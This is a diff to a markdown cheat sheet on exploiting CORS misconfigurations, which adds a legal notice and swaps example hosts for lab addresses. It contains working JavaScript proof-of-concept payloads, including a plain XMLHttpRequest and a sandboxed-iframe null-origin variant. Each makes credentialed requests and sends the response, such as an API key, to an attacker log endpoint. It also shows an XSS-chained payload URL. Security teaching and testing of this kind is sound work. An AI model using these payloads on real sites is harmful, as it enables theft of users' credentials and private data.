@@ -1,5 +1,9 @@
 # CORS Misconfiguration
 
+> **Legal Notice:** This document is for authorized security testing and educational purposes only. Only test against systems you own or have explicit written permission to assess. Unauthorized testing is illegal under the CFAA, UK Computer Misuse Act, and equivalent laws. **Obtain written scope authorization before testing.**
+
+---
+
 > A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials. 
 
 ## Summary
@@ -16,13 +20,13 @@
 
 ## Prerequisites
 
-* BURP HEADER> `Origin: https://evil.com`
+* BURP HEADER> `Origin: http://attacker.lab`
 * VICTIM HEADER> `Access-Control-Allow-Credential: true`
-* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
+* VICTIM HEADER> `Access-Control-Allow-Origin: http://attacker.lab` OR `Access-Control-Allow-Origin: null`
 
 ## Exploitation
 
-Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.
+Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `http://127.0.0.1/endpoint`.
 
 ### Vulnerable Example: Origin Reflection
 
@@ -30,12 +34,12 @@ Usually you want to target an API endpoint. Use the following payload to exploit
 
 ```powershell
 GET /endpoint HTTP/1.1
-Host: victim.example.com
-Origin: https://evil.com
+Host: 127.0.0.1
+Origin: http://attacker.lab
 Cookie: sessionid=... 
 
 HTTP/1.1 200 OK
-Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Origin: http://attacker.lab
 Access-Control-Allow-Credentials: true 
 
 {"[private API key]"}
@@ -43,17 +47,17 @@ Access-Control-Allow-Credentials: true
 
 #### Proof of concept
 
-This PoC requires that the respective JS script is hosted at `evil.com`
+This PoC requires that the respective JS script is hosted at `attacker.lab`
 
 ```js
 var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
-req.open('get','https://victim.example.com/endpoint',true); 
+req.open('get','http://127.0.0.1/endpoint',true); 
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//atttacker.net/log?key='+this.responseText; 
+    location='//attacker.lab/log?key='+this.responseText; 
 };
 ```
 
@@ -94,7 +98,7 @@ response:
 
 ```
 GET /endpoint HTTP/1.1
-Host: victim.example.com
+Host: 127.0.0.1
 Origin: null
 Cookie: sessionid=... 
 
@@ -115,12 +119,12 @@ origin in the request:
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
-  req.open('get','https://victim.example.com/endpoint',true);
+  req.open('get','http://127.0.0.1/endpoint',true);
   req.withCredentials = true;
   req.send();
 
   function reqListener() {
-    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
+    location='http://attacker.lab/log?key='+encodeURIComponent(this.responseText);
    };
 </script>"></iframe> 
 ```
@@ -133,7 +137,7 @@ origin, you can inject the exploit coded from above in order to exploit CORS
 again.
 
 ```
-https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
+http://trusted.lab/?xss=<script>CORS-ATTACK-PAYLOAD</script>
 ```
 
 ### Vulnerable Example: Wildcard Origin `*` without Credentials
